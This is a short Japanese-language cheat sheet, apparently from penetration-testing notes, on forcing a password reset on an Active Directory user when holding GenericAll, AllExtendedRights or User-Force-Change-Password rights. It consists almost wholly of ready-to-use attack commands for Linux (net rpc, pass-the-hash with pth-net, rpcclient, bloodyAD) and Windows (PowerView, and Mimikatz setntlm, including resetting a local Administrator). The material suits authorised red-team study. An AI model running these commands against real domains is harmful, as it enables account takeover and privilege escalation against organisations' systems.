この悪用は、`GenericAll`、`AllExtendedRights`、または`User-Force-Change-Passwordを`持つオブジェクトを制御する際に、ターゲットユーザーに対して実行できる

## Linux

```
net rpc password "<TargetUser>" -U "<DOMAIN>"/"<USERNAME>%<PASSWORD>" -S "<DC_IP>"

# Pass-The-Hash
pth-net rpc password "<TargetUser>" -U "<DOMAIN>"/"<USERNAME>"%"ffffffffffffffffffffffffffffffff":"<NTLM_HASH>" -S "<DC_IP>"
```

rpcclient

```
rpcclient -U <DOMAIN>/<USER> <dc_ip>
rpcclient $> setuserinfo2 <TargetUser> 23 <NewPassword>
```

bloodyAD

```
bloodyAD --host "<DC_IP>" -d "<DOMAIN>" -u "<USERNAME>" -p "<PASSWORD>" set password "<TargetUser>" "<NewPassword>"
```

## Windows

PowerView

```
# 変数を作成してPassword123!を新しいパスワードに設定
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity '<Target_User>' -AccountPassword $NewPassword

# 変数なし
Set-DomainUserPassword -Identity '<Target_User>' -Verbose
Set-DomainUserPassword -Identity '<Target_User>' -AccountPassword (ConvertTo-SecureString '<NewPassword>' -AsPlainText -Force) -Verbose
```

Mimikatz

```
# ドメインユーザーのリセット
lsadump::setntlm /user:<Target_User> /password:<NewPassword> /server:<DC>

# ローカルユーザーのリセット
lsadump::setntlm /user:Administrator /password:<New_Admin_Password> /server:<Local_Server>
```